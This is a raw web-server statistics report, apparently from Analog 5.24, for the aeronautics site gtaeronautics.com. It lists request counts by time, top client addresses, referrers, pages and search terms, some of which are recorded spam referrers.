x	VE	analog 5.24
x	HN	gtaeronautics.com
5	Rr	1	0.000	2021	07	02	14	30
5	Rr	2	0.000	2021	07	02	14	25
5	Rr	0	0.000	2021	07	02	14	20
5	Rr	1	0.000	2021	07	02	14	15
5	Rr	0	0.000	2021	07	02	14	10
5	Rr	1	0.000	2021	07	02	14	05
5	Rr	0	0.000	2021	07	02	14	00
5	Rr	0	0.000	2021	07	02	13	55
5	Rr	0	0.000	2021	07	02	13	50
5	Rr	1	0.000	2021	07	02	13	45
5	Rr	0	0.000	2021	07	02	13	40
5	Rr	0	0.000	2021	07	02	13	35
5	Rr	1	0.000	2021	07	02	13	30
5	Rr	0	0.000	2021	07	02	13	25
5	Rr	1	0.000	2021	07	02	13	20
5	Rr	0	0.000	2021	07	02	13	15
5	Rr	1	0.000	2021	07	02	13	10
5	Rr	1	0.000	2021	07	02	13	05
5	Rr	0	0.000	2021	07	02	13	00
5	Rr	1	0.000	2021	07	02	12	55
5	Rr	0	0.000	2021	07	02	12	50
5	Rr	1	0.000	2021	07	02	12	45
5	Rr	0	0.000	2021	07	02	12	40
5	Rr	1	0.000	2021	07	02	12	35
5	Rr	0	0.000	2021	07	02	12	30
5	Rr	0	0.000	2021	07	02	12	25
5	Rr	1	0.000	2021	07	02	12	20
5	Rr	1	0.000	2021	07	02	12	15
5	Rr	1	0.000	2021	07	02	12	10
5	Rr	0	0.000	2021	07	02	12	05
5	Rr	8	0.001	2021	07	02	12	00
5	Rr	2	0.000	2021	07	02	11	55
5	Rr	0	0.000	2021	07	02	11	50
5	Rr	2	0.000	2021	07	02	11	45
5	Rr	10	0.001	2021	07	02	11	40
5	Rr	2	0.000	2021	07	02	11	35
5	Rr	3	0.000	2021	07	02	11	30
5	Rr	1	0.000	2021	07	02	11	25
5	Rr	2	0.000	2021	07	02	11	20
5	Rr	1	0.000	2021	07	02	11	15
5	Rr	2	0.000	2021	07	02	11	10
5	Rr	0	0.000	2021	07	02	11	05
5	Rr	1	0.000	2021	07	02	11	00
5	Rr	1	0.000	2021	07	02	10	55
5	Rr	1	0.000	2021	07	02	10	50
5	Rr	2	0.000	2021	07	02	10	45
5	Rr	0	0.000	2021	07	02	10	40
5	Rr	4	0.000	2021	07	02	10	35
5	Rr	1	0.000	2021	07	02	10	30
5	Rr	0	0.000	2021	07	02	10	25
5	Rr	0	0.000	2021	07	02	10	20
5	Rr	0	0.000	2021	07	02	10	15
5	Rr	0	0.000	2021	07	02	10	10
5	Rr	1	0.000	2021	07	02	10	05
5	Rr	1	0.000	2021	07	02	10	00
5	Rr	0	0.000	2021	07	02	09	55
5	Rr	0	0.000	2021	07	02	09	50
5	Rr	3	0.000	2021	07	02	09	45
5	Rr	0	0.000	2021	07	02	09	40
5	Rr	0	0.000	2021	07	02	09	35
5	Rr	0	0.000	2021	07	02	09	30
5	Rr	1	0.000	2021	07	02	09	25
5	Rr	0	0.000	2021	07	02	09	20
5	Rr	0	0.000	2021	07	02	09	15
5	Rr	1	0.000	2021	07	02	09	10
5	Rr	0	0.000	2021	07	02	09	05
5	Rr	2	0.000	2021	07	02	09	00
5	Rr	0	0.000	2021	07	02	08	55
5	Rr	0	0.000	2021	07	02	08	50
5	Rr	1	0.000	2021	07	02	08	45
5	Rr	0	0.000	2021	07	02	08	40
5	Rr	0	0.000	2021	07	02	08	35
5	Rr	0	0.000	2021	07	02	08	30
5	Rr	0	0.000	2021	07	02	08	25
5	Rr	1	0.000	2021	07	02	08	20
5	Rr	2	0.000	2021	07	02	08	15
5	Rr	0	0.000	2021	07	02	08	10
5	Rr	0	0.000	2021	07	02	08	05
5	Rr	0	0.000	2021	07	02	08	00
5	Rr	1	0.000	2021	07	02	07	55
5	Rr	0	0.000	2021	07	02	07	50
5	Rr	0	0.000	2021	07	02	07	45
5	Rr	1	0.000	2021	07	02	07	40
5	Rr	0	0.000	2021	07	02	07	35
5	Rr	0	0.000	2021	07	02	07	30
5	Rr	0	0.000	2021	07	02	07	25
5	Rr	0	0.000	2021	07	02	07	20
5	Rr	0	0.000	2021	07	02	07	15
5	Rr	4	0.000	2021	07	02	07	10
5	Rr	1	0.000	2021	07	02	07	05
5	Rr	0	0.000	2021	07	02	07	00
5	Rr	15	0.002	2021	07	02	06	55
5	Rr	0	0.000	2021	07	02	06	50
5	Rr	1	0.000	2021	07	02	06	45
5	Rr	0	0.000	2021	07	02	06	40
5	Rr	0	0.000	2021	07	02	06	35
5	Rr	0	0.000	2021	07	02	06	30
5	Rr	0	0.000	2021	07	02	06	25
5	Rr	0	0.000	2021	07	02	06	20
5	Rr	1	0.000	2021	07	02	06	15
5	Rr	0	0.000	2021	07	02	06	10
5	Rr	2	0.000	2021	07	02	06	05
5	Rr	0	0.000	2021	07	02	06	00
5	Rr	1	0.000	2021	07	02	05	55
5	Rr	0	0.000	2021	07	02	05	50
5	Rr	0	0.000	2021	07	02	05	45
5	Rr	0	0.000	2021	07	02	05	40
5	Rr	12	0.001	2021	07	02	05	35
5	Rr	0	0.000	2021	07	02	05	30
5	Rr	0	0.000	2021	07	02	05	25
5	Rr	1	0.000	2021	07	02	05	20
5	Rr	1	0.000	2021	07	02	05	15
5	Rr	0	0.000	2021	07	02	05	10
5	Rr	0	0.000	2021	07	02	05	05
5	Rr	0	0.000	2021	07	02	05	00
5	Rr	0	0.000	2021	07	02	04	55
5	Rr	1	0.000	2021	07	02	04	50
5	Rr	0	0.000	2021	07	02	04	45
5	Rr	0	0.000	2021	07	02	04	40
5	Rr	1	0.000	2021	07	02	04	35
5	Rr	0	0.000	2021	07	02	04	30
5	Rr	0	0.000	2021	07	02	04	25
5	Rr	0	0.000	2021	07	02	04	20
5	Rr	2	0.000	2021	07	02	04	15
5	Rr	0	0.000	2021	07	02	04	10
5	Rr	1	0.000	2021	07	02	04	05
5	Rr	0	0.000	2021	07	02	04	00
5	Rr	0	0.000	2021	07	02	03	55
5	Rr	1	0.000	2021	07	02	03	50
5	Rr	0	0.000	2021	07	02	03	45
5	Rr	1	0.000	2021	07	02	03	40
5	Rr	7	0.001	2021	07	02	03	35
5	Rr	0	0.000	2021	07	02	03	30
5	Rr	4	0.000	2021	07	02	03	25
5	Rr	2	0.000	2021	07	02	03	20
5	Rr	0	0.000	2021	07	02	03	15
5	Rr	1	0.000	2021	07	02	03	10
5	Rr	0	0.000	2021	07	02	03	05
5	Rr	1	0.000	2021	07	02	03	00
5	Rr	0	0.000	2021	07	02	02	55
5	Rr	0	0.000	2021	07	02	02	50
5	Rr	0	0.000	2021	07	02	02	45
5	Rr	4	0.000	2021	07	02	02	40
5	Rr	0	0.000	2021	07	02	02	35
5	Rr	0	0.000	2021	07	02	02	30
5	Rr	0	0.000	2021	07	02	02	25
5	Rr	0	0.000	2021	07	02	02	20
5	Rr	1	0.000	2021	07	02	02	15
5	Rr	0	0.000	2021	07	02	02	10
5	Rr	1	0.000	2021	07	02	02	05
5	Rr	2	0.000	2021	07	02	02	00
5	Rr	0	0.000	2021	07	02	01	55
5	Rr	0	0.000	2021	07	02	01	50
5	Rr	0	0.000	2021	07	02	01	45
5	Rr	0	0.000	2021	07	02	01	40
5	Rr	0	0.000	2021	07	02	01	35
5	Rr	1	0.000	2021	07	02	01	30
5	Rr	0	0.000	2021	07	02	01	25
5	Rr	0	0.000	2021	07	02	01	20
5	Rr	0	0.000	2021	07	02	01	15
5	Rr	2	0.000	2021	07	02	01	10
5	Rr	0	0.000	2021	07	02	01	05
5	Rr	0	0.000	2021	07	02	01	00
5	Rr	0	0.000	2021	07	02	00	55
5	Rr	1	0.000	2021	07	02	00	50
5	Rr	0	0.000	2021	07	02	00	45
5	Rr	0	0.000	2021	07	02	00	40
5	Rr	1	0.000	2021	07	02	00	35
5	Rr	1	0.000	2021	07	02	00	30
5	Rr	2	0.000	2021	07	02	00	25
5	Rr	0	0.000	2021	07	02	00	20
5	Rr	1	0.000	2021	07	02	00	15
5	Rr	0	0.000	2021	07	02	00	10
5	Rr	1	0.000	2021	07	02	00	05
5	Rr	1	0.000	2021	07	02	00	00
5	*BT	R	715	2020	12	11	23	20
7	Rr	2963	0.308	00	00
7	Rr	3441	0.357	00	05
7	Rr	3042	0.316	00	10
7	Rr	2654	0.275	00	15
7	Rr	3182	0.330	00	20
7	Rr	3658	0.380	00	25
7	Rr	3070	0.319	00	30
7	Rr	3074	0.319	00	35
7	Rr	3186	0.331	00	40
7	Rr	3237	0.336	00	45
7	Rr	3506	0.364	00	50
7	Rr	2968	0.308	00	55
7	Rr	2827	0.293	01	00
7	Rr	3096	0.321	01	05
7	Rr	3207	0.333	01	10
7	Rr	3120	0.324	01	15
7	Rr	3258	0.338	01	20
7	Rr	2869	0.298	01	25
7	Rr	3006	0.312	01	30
7	Rr	3171	0.329	01	35
7	Rr	3165	0.329	01	40
7	Rr	2976	0.309	01	45
7	Rr	2830	0.294	01	50
7	Rr	3237	0.336	01	55
7	Rr	2937	0.305	02	00
7	Rr	3050	0.317	02	05
7	Rr	2970	0.308	02	10
7	Rr	3482	0.361	02	15
7	Rr	3102	0.322	02	20
7	Rr	3200	0.332	02	25
7	Rr	3108	0.323	02	30
7	Rr	3444	0.357	02	35
7	Rr	3025	0.314	02	40
7	Rr	3045	0.316	02	45
7	Rr	2803	0.291	02	50
7	Rr	3441	0.357	02	55
7	Rr	3061	0.318	03	00
7	Rr	2943	0.305	03	05
7	Rr	2991	0.310	03	10
7	Rr	3049	0.316	03	15
7	Rr	2832	0.294	03	20
7	Rr	2835	0.294	03	25
7	Rr	2880	0.299	03	30
7	Rr	3093	0.321	03	35
7	Rr	3078	0.319	03	40
7	Rr	3378	0.351	03	45
7	Rr	3785	0.393	03	50
7	Rr	3083	0.320	03	55
7	Rr	2940	0.305	04	00
7	Rr	2976	0.309	04	05
7	Rr	3107	0.322	04	10
7	Rr	3193	0.331	04	15
7	Rr	3367	0.349	04	20
7	Rr	3007	0.312	04	25
7	Rr	2930	0.304	04	30
7	Rr	2703	0.281	04	35
7	Rr	2770	0.288	04	40
7	Rr	3254	0.338	04	45
7	Rr	2869	0.298	04	50
7	Rr	2893	0.300	04	55
7	Rr	2632	0.273	05	00
7	Rr	2583	0.268	05	05
7	Rr	3030	0.314	05	10
7	Rr	3017	0.313	05	15
7	Rr	3104	0.322	05	20
7	Rr	2897	0.301	05	25
7	Rr	3123	0.324	05	30
7	Rr	2965	0.308	05	35
7	Rr	2592	0.269	05	40
7	Rr	2681	0.278	05	45
7	Rr	2611	0.271	05	50
7	Rr	2823	0.293	05	55
7	Rr	2795	0.290	06	00
7	Rr	3481	0.361	06	05
7	Rr	2886	0.300	06	10
7	Rr	2869	0.298	06	15
7	Rr	2712	0.281	06	20
7	Rr	2765	0.287	06	25
7	Rr	2636	0.274	06	30
7	Rr	2800	0.291	06	35
7	Rr	2928	0.304	06	40
7	Rr	3001	0.311	06	45
7	Rr	2396	0.249	06	50
7	Rr	2366	0.246	06	55
7	Rr	3071	0.319	07	00
7	Rr	2611	0.271	07	05
7	Rr	2747	0.285	07	10
7	Rr	2618	0.272	07	15
7	Rr	2830	0.294	07	20
7	Rr	3250	0.337	07	25
7	Rr	3235	0.336	07	30
7	Rr	2887	0.300	07	35
7	Rr	2565	0.266	07	40
7	Rr	2548	0.264	07	45
7	Rr	2424	0.252	07	50
7	Rr	2519	0.261	07	55
7	Rr	2667	0.277	08	00
7	Rr	2786	0.289	08	05
7	Rr	2667	0.277	08	10
7	Rr	2523	0.262	08	15
7	Rr	2602	0.270	08	20
7	Rr	2695	0.280	08	25
7	Rr	3155	0.327	08	30
7	Rr	2751	0.286	08	35
7	Rr	2654	0.275	08	40
7	Rr	2533	0.263	08	45
7	Rr	2498	0.259	08	50
7	Rr	2493	0.259	08	55
7	Rr	2446	0.254	09	00
7	Rr	2792	0.290	09	05
7	Rr	2466	0.256	09	10
7	Rr	2447	0.254	09	15
7	Rr	2825	0.293	09	20
7	Rr	2612	0.271	09	25
7	Rr	2683	0.278	09	30
7	Rr	2368	0.246	09	35
7	Rr	2631	0.273	09	40
7	Rr	2480	0.257	09	45
7	Rr	2309	0.240	09	50
7	Rr	2464	0.256	09	55
7	Rr	2425	0.252	10	00
7	Rr	2358	0.245	10	05
7	Rr	2509	0.260	10	10
7	Rr	2451	0.254	10	15
7	Rr	2348	0.244	10	20
7	Rr	2596	0.269	10	25
7	Rr	2450	0.254	10	30
7	Rr	2481	0.258	10	35
7	Rr	2649	0.275	10	40
7	Rr	2406	0.250	10	45
7	Rr	2684	0.279	10	50
7	Rr	2906	0.302	10	55
7	Rr	3814	0.396	11	00
7	Rr	2940	0.305	11	05
7	Rr	2746	0.285	11	10
7	Rr	2674	0.278	11	15
7	Rr	2807	0.291	11	20
7	Rr	2491	0.259	11	25
7	Rr	2795	0.290	11	30
7	Rr	2427	0.252	11	35
7	Rr	2792	0.290	11	40
7	Rr	2715	0.282	11	45
7	Rr	2775	0.288	11	50
7	Rr	2795	0.290	11	55
7	Rr	3418	0.355	12	00
7	Rr	3081	0.320	12	05
7	Rr	3096	0.321	12	10
7	Rr	2629	0.273	12	15
7	Rr	2768	0.287	12	20
7	Rr	2676	0.278	12	25
7	Rr	2750	0.285	12	30
7	Rr	2689	0.279	12	35
7	Rr	2841	0.295	12	40
7	Rr	2948	0.306	12	45
7	Rr	2698	0.280	12	50
7	Rr	2808	0.291	12	55
7	Rr	2911	0.302	13	00
7	Rr	2914	0.302	13	05
7	Rr	3182	0.330	13	10
7	Rr	2968	0.308	13	15
7	Rr	2894	0.300	13	20
7	Rr	3055	0.317	13	25
7	Rr	3130	0.325	13	30
7	Rr	3433	0.356	13	35
7	Rr	3012	0.313	13	40
7	Rr	2615	0.271	13	45
7	Rr	3171	0.329	13	50
7	Rr	3120	0.324	13	55
7	Rr	3139	0.326	14	00
7	Rr	3496	0.363	14	05
7	Rr	3478	0.361	14	10
7	Rr	3642	0.378	14	15
7	Rr	3461	0.359	14	20
7	Rr	3462	0.359	14	25
7	Rr	3851	0.400	14	30
7	Rr	3572	0.371	14	35
7	Rr	3251	0.337	14	40
7	Rr	3333	0.346	14	45
7	Rr	3516	0.365	14	50
7	Rr	3916	0.406	14	55
7	Rr	3979	0.413	15	00
7	Rr	4167	0.433	15	05
7	Rr	3670	0.381	15	10
7	Rr	3765	0.391	15	15
7	Rr	3508	0.364	15	20
7	Rr	3956	0.411	15	25
7	Rr	4182	0.434	15	30
7	Rr	3735	0.388	15	35
7	Rr	4017	0.417	15	40
7	Rr	3999	0.415	15	45
7	Rr	4099	0.425	15	50
7	Rr	4307	0.447	15	55
7	Rr	4130	0.429	16	00
7	Rr	4325	0.449	16	05
7	Rr	4063	0.422	16	10
7	Rr	4521	0.469	16	15
7	Rr	4029	0.418	16	20
7	Rr	3726	0.387	16	25
7	Rr	4134	0.429	16	30
7	Rr	4363	0.453	16	35
7	Rr	4380	0.455	16	40
7	Rr	4399	0.457	16	45
7	Rr	4447	0.462	16	50
7	Rr	4268	0.443	16	55
7	Rr	4169	0.433	17	00
7	Rr	4133	0.429	17	05
7	Rr	4496	0.467	17	10
7	Rr	4119	0.428	17	15
7	Rr	4184	0.434	17	20
7	Rr	4297	0.446	17	25
7	Rr	4323	0.449	17	30
7	Rr	4387	0.455	17	35
7	Rr	4212	0.437	17	40
7	Rr	4076	0.423	17	45
7	Rr	4263	0.442	17	50
7	Rr	4074	0.423	17	55
7	Rr	3712	0.385	18	00
7	Rr	4058	0.421	18	05
7	Rr	4723	0.490	18	10
7	Rr	4477	0.465	18	15
7	Rr	4114	0.427	18	20
7	Rr	4569	0.474	18	25
7	Rr	4331	0.450	18	30
7	Rr	4434	0.460	18	35
7	Rr	4406	0.457	18	40
7	Rr	4367	0.453	18	45
7	Rr	4326	0.449	18	50
7	Rr	4417	0.458	18	55
7	Rr	4862	0.505	19	00
7	Rr	4610	0.478	19	05
7	Rr	4477	0.465	19	10
7	Rr	4201	0.436	19	15
7	Rr	4116	0.427	19	20
7	Rr	3955	0.411	19	25
7	Rr	4093	0.425	19	30
7	Rr	4297	0.446	19	35
7	Rr	4356	0.452	19	40
7	Rr	4515	0.469	19	45
7	Rr	3885	0.403	19	50
7	Rr	4081	0.424	19	55
7	Rr	4123	0.428	20	00
7	Rr	4641	0.482	20	05
7	Rr	4508	0.468	20	10
7	Rr	4095	0.425	20	15
7	Rr	4391	0.456	20	20
7	Rr	4229	0.439	20	25
7	Rr	3826	0.397	20	30
7	Rr	4080	0.423	20	35
7	Rr	4298	0.446	20	40
7	Rr	4607	0.478	20	45
7	Rr	4180	0.434	20	50
7	Rr	4309	0.447	20	55
7	Rr	4772	0.495	21	00
7	Rr	3911	0.406	21	05
7	Rr	4143	0.430	21	10
7	Rr	4006	0.416	21	15
7	Rr	3633	0.377	21	20
7	Rr	4285	0.445	21	25
7	Rr	3676	0.382	21	30
7	Rr	3891	0.404	21	35
7	Rr	3911	0.406	21	40
7	Rr	3930	0.408	21	45
7	Rr	4164	0.432	21	50
7	Rr	3704	0.384	21	55
7	Rr	3796	0.394	22	00
7	Rr	3584	0.372	22	05
7	Rr	3775	0.392	22	10
7	Rr	3455	0.359	22	15
7	Rr	3874	0.402	22	20
7	Rr	3871	0.402	22	25
7	Rr	3604	0.374	22	30
7	Rr	3955	0.411	22	35
7	Rr	3488	0.362	22	40
7	Rr	3522	0.366	22	45
7	Rr	3747	0.389	22	50
7	Rr	3567	0.370	22	55
7	Rr	3952	0.410	23	00
7	Rr	3621	0.376	23	05
7	Rr	3552	0.369	23	10
7	Rr	3580	0.372	23	15
7	Rr	4188	0.435	23	20
7	Rr	3406	0.354	23	25
7	Rr	3172	0.329	23	30
7	Rr	3524	0.366	23	35
7	Rr	3256	0.338	23	40
7	Rr	3253	0.338	23	45
7	Rr	3233	0.336	23	50
7	Rr	2998	0.311	23	55
o	*f	0R	r
o	lRQ	1	963440	320065209	[unresolved numerical addresses]
Z	*f	-20R	r
Z	lRb	1	42669	3.197	66.249
Z	lRb	1	40146	1.882	69
Z	lRb	1	24899	0.967	46
Z	lRb	1	24253	1.951	35
Z	lRb	1	21832	3.145	157.55
Z	lRb	1	17716	2.954	70
Z	lRb	1	16575	2.256	207.46
Z	lRb	1	15538	1.789	54
Z	lRb	1	15347	1.465	76
Z	lRb	1	15032	1.194	34
Z	lRb	1	14961	2.497	40
Z	lRb	1	13261	1.717	72
Z	lRb	1	12111	0.109	178.137
Z	lRb	1	11773	1.146	75
Z	lRb	1	11610	1.320	5
Z	lRb	1	10783	0.912	74
Z	lRb	1	10650	1.043	123
Z	lRb	1	9740	0.620	71
Z	lRb	1	8982	0.576	37
Z	lRb	1	8631	0.968	104
Z	lRb	1	616931	68.293	[not listed: 8566]
S	*f	-50P	r
S	Rb	4702	0.471	14.33.246.211
S	Rb	3578	0.725	192.234.235.103
S	Rb	3248	0.295	192.99.15.146
S	Rb	2341	0.163	100.43.83.148
S	Rb	1992	0.082	66.249.75.109
S	Rb	1829	0.178	37.59.14.116
S	Rb	1781	0.257	75.98.173.33
S	Rb	1597	0.156	78.155.138.20
S	Rb	1543	0.088	199.21.99.79
S	Rb	1459	0.012	92.249.127.111
S	Rb	1330	0.022	109.102.111.58
S	Rb	1312	0.054	205.203.134.197
S	Rb	1304	0.230	5.196.13.127
S	Rb	1276	0.143	208.115.113.82
S	Rb	1270	0.078	95.108.248.29
S	Rb	1142	0.001	91.207.9.226
S	Rb	1107	0.020	66.249.69.97
S	Rb	1097	0.261	75.98.173.84
S	Rb	1081	0.022	66.249.69.81
S	Rb	1051	0.038	66.249.69.192
S	Rb	1039	0.018	66.249.69.89
S	Rb	1030	0.117	5.255.250.90
S	Rb	1024	0.088	95.108.150.235
S	Rb	1012	0.098	192.99.6.132
S	Rb	969	0.048	49.7.20.102
S	Rb	957	0.218	199.21.99.197
S	Rb	951	0.074	66.249.73.133
S	Rb	893	0.020	106.38.241.144
S	Rb	880	0.179	79.125.27.96
S	Rb	825	0.039	144.76.27.118
S	Rb	815	0.036	178.63.23.80
S	Rb	812	0.112	66.249.64.90
S	Rb	808	0.218	149.202.211.239
S	Rb	791	0.077	192.99.7.55
S	Rb	786	0.140	66.11.128.152
S	Rb	777	0.001	193.150.120.14
S	Rb	760	0.061	208.115.113.92
S	Rb	756	0.025	82.145.46.102
S	Rb	744	0.012	109.102.111.20
S	Rb	739	0.011	109.102.111.50
S	Rb	704	0.001	109.120.157.179
S	Rb	698	0.030	220.181.125.162
S	Rb	694	0.046	78.155.138.30
S	Rb	686	0.024	66.249.65.212
S	Rb	664	0.065	94.23.59.173
S	Rb	653	0.086	52.21.132.215
S	Rb	649	0.063	46.105.74.59
S	Rb	627	0.018	66.249.65.205
S	Rb	627	0.014	66.249.65.219
S	Rb	609	0.059	94.23.215.29
S	Rb	903421	94.706	[not listed: 85161]
s	*FR	2013	12	18	21	53
s	*LR	2021	07	02	22	43
s	*f	-20R	s
s	lRS	1	185762	612	http://www.gtaeronautics.com/
s	lRS	1	43534	163	http://gtaeronautics.com/
s	lRS	1	4785	6	https://www.google.com/
s	lRS	1	235	4	https://www.thomasnet.com/
s	lRS	1	1539	0	http://www.google.com/
s	lRS	1	1159	0	http://www.trainingindustry.com/
s	lRS	1	1122	0	http://www.baidu.com/
s	lRS	1	609	0	http://www.mfgpages.com/
s	lRS	1	604	0	http://www.openfos.com/
s	lRS	1	517	0	http://www.topicway.com/
s	lRS	1	462	0	http://anti-crisis-seo.com/
s	lRS	1	395	0	http://uptime.com/
s	lRS	1	362	0	http://semalt.semalt.com/
s	lRS	1	325	0	http://www.bing.com/
s	lRS	1	301	0	http://chimiver.info/
s	lRS	1	280	0	https://www.google.co.in/
s	lRS	1	262	0	http://google.co.jp/
s	lRS	1	241	0	https://www.bing.com/
s	lRS	1	236	0	http://www.thomasnet.com/
s	lRS	1	234	0	http://www.artparquet.ru/
s	lRS	1	47687	42	[not listed: 4241]
f	*FR	2013	12	18	21	53
f	*LR	2021	07	02	22	43
f	*f	-30R	s
f	lRS	1	123846	479	http://www.gtaeronautics.com/
f	lRS	1	29618	147	http://gtaeronautics.com/
f	lRS	1	1513	17	http://www.gtaeronautics.com/consultinga.html
f	lRS	1	6810	16	http://www.gtaeronautics.com/CCT&M.html
f	lRS	1	8962	14	http://www.gtaeronautics.com/aboutus.html
f	lRS	1	5734	12	http://www.gtaeronautics.com/UASFC.html
f	lRS	1	2029	12	http://www.gtaeronautics.com/GT1500 RPAS.html
f	lRS	1	1685	11	http://www.gtaeronautics.com/SRU.html
f	lRS	1	2242	10	http://www.gtaeronautics.com/GT380 RPAS.html
f	lRS	1	1287	9	http://www.gtaeronautics.com/contactus.html
f	lRS	1	4404	6	https://www.google.com/
f	lRS	1	1486	6	http://www.gtaeronautics.com/GT50T RPAS.html
f	lRS	1	1063	4	http://www.gtaeronautics.com/links.html
f	lRS	1	5443	1	http://gtaeronautics.com/IndNews.html
f	lRS	1	2405	1	http://www.gtaeronautics.com/pna.html
f	lRS	1	1830	1	http://www.gtaeronautics.com/CompNews.html
f	lRS	1	1264	1	http://gtaeronautics.com/aboutus.html
f	lRS	1	4071	0	http://www.gtaeronautics.com/index.html
f	lRS	1	4069	0	http://www.gtaeronautics.com/ConsultingA.html
f	lRS	1	1975	0	http://www.gtaeronautics.com/uasfc.html
f	lRS	1	1883	0	http://www.gtaeronautics.com/RD.html
f	lRS	1	1758	0	http://www.gtaeronautics.com/CFMT.html
f	lRS	1	1522	0	http://www.gtaeronautics.com/EMPLOYMENT.html
f	lRS	1	1465	0	http://www.gtaeronautics.com/IndNews.html
f	lRS	1	1159	0	http://www.trainingindustry.com/
f	lRS	1	1140	0	http://www.gtaeronautics.com/compnews.html
f	lRS	1	1079	0	http://www.baidu.com/s
f	lRS	1	892	0	http://www.google.com/url
f	lRS	1	865	0	http://www.gtaeronautics.com/FAQ.html
f	lRS	1	765	0	http://gtaeronautics.com/index.html
f	lRS	1	66387	80	[not listed: 4860]
n	*FR	2013	12	19	00	28
n	*LR	2020	10	14	09	11
n	*f	0.500000%Q	s
n	Rq	1	618.652	kit
n	Rq	1	618.652	method
n	Rq	2	571.824	crew
n	Rq	28	300.744	aeronautical
n	Rq	1	618.652	airplane.com
n	Rq	5	431.340	faa
n	Rq	40	19.776	gt
n	Rq	1	618.652	moldings
n	Rq	1	618.652	twin
n	Rq	1	618.652	taranis
n	Rq	2	618.652	installerex
n	Rq	2	618.652	http://gtaeronautics.com/
n	Rq	20	197.200	in
n	Rq	1	618.652	scale
n	Rq	1	618.652	observer
n	Rq	1	618.652	drawing?
n	Rq	2	618.652	is
n	Rq	1	618.652	making
n	Rq	2	571.824	fiber
n	Rq	1	618.652	mitsubishi
n	Rq	1	618.652	fuze
n	Rq	1	618.652	http://www.gtaeronautics.com/indnews.html
n	Rq	92	618.652	semalt.com
n	Rq	1	618.652	consultant
n	Rq	15	478.168	manufacturing
n	Rq	1	618.652	2
n	Rq	1	618.652	base
n	Rq	14	9.888	6
n	Rq	1	618.652	http://gtaeronautics.com/indnews.html
n	Rq	1	618.652	always
n	Rq	28	160.260	engineering
n	Rq	1	618.652	northrop
n	Rq	1	618.652	bandwidth
n	Rq	1	618.652	vegas
n	Rq	3	571.824	basic
n	Rq	1	618.652	qinetiq
n	Rq	1	618.652	tooling
n	Rq	1	618.652	on
n	Rq	1	618.652	heavy
n	Rq	9	290.856	drawings
n	Rq	1	618.652	fia
n	Rq	4	618.652	louis%20vuitton%20fashion%20valley%20phone%20number
n	Rq	3	618.652	llc
n	Rq	3	524.996	rullman
n	Rq	1	618.652	cowling
n	Rq	32	524.996	sale
n	Rq	64	384.512	outlet
n	Rq	1	618.652	rotax
n	Rq	1	618.652	ucav
n	Rq	28	207.088	texan
n	Rq	1	618.652	a
n	Rq	2	618.652	customer
n	Rq	1	618.652	rpa
n	Rq	2	571.824	110cc
n	Rq	30	618.652	designer
n	Rq	20	431.340	www.gtaeronautics.com
n	Rq	1	618.652	work
n	Rq	1	618.652	thomas
n	Rq	1	618.652	engie
n	Rq	1	618.652	qualification
n	Rq	1	618.652	custom
n	Rq	1	618.652	mk3
n	Rq	1	618.652	t
n	Rq	1	618.652	uavs
n	Rq	1	618.652	w
n	Rq	2	618.652	satisfaction
n	Rq	2	571.824	x
n	Rq	1	618.652	crews
n	Rq	3	618.652	photos
n	Rq	1	618.652	finnemeccia
n	Rq	2	571.824	glass
n	Rq	1	524.996	to
n	Rq	1	618.652	gcs
n	Rq	5	431.340	engineer
n	Rq	1	618.652	government
n	Rq	1	618.652	operator
n	Rq	6	384.512	aircraft
n	Rq	1	618.652	with
n	Rq	97	571.824	number
n	Rq	4	524.996	for
n	Rq	1	618.652	december
n	Rq	2	571.824	aero
n	Rq	9	571.824	equipment
n	Rq	2	571.824	engine
n	Rq	1	618.652	mq1
n	Rq	2	571.824	wy
n	Rq	1	618.652	custum
n	Rq	1	618.652	g.t
n	Rq	1	618.652	mechanics
n	Rq	1	571.824	motors
n	Rq	1	618.652	tdw
n	Rq	32	431.340	luggage
n	Rq	1	618.652	opportunities
n	Rq	175	534.884	vuitton
n	Rq	1	618.652	show
n	Rq	1	524.996	the
n	Rq	1	618.652	luggages
n	Rq	1	618.652	stroke
n	Rq	2	618.652	explore
n	Rq	39	571.824	handbags
n	Rq	2	571.824	electric
n	Rq	1	618.652	space
n	Rq	1	571.824	air
n	Rq	1	618.652	quote
n	Rq	1	618.652	require
n	Rq	1	618.652	mpp
n	Rq	4	571.824	jobs
n	Rq	5	431.340	uas
n	Rq	1	618.652	anything
n	Rq	1	618.652	china
n	Rq	1	618.652	airplane
n	Rq	10	197.200	uav
n	Rq	2	618.652	wmaid.com
n	Rq	3	478.168	drone
n	Rq	7	337.684	fiberglass
n	Rq	2	618.652	facebook
n	Rq	1	618.652	college
n	Rq	4	478.168	onboard
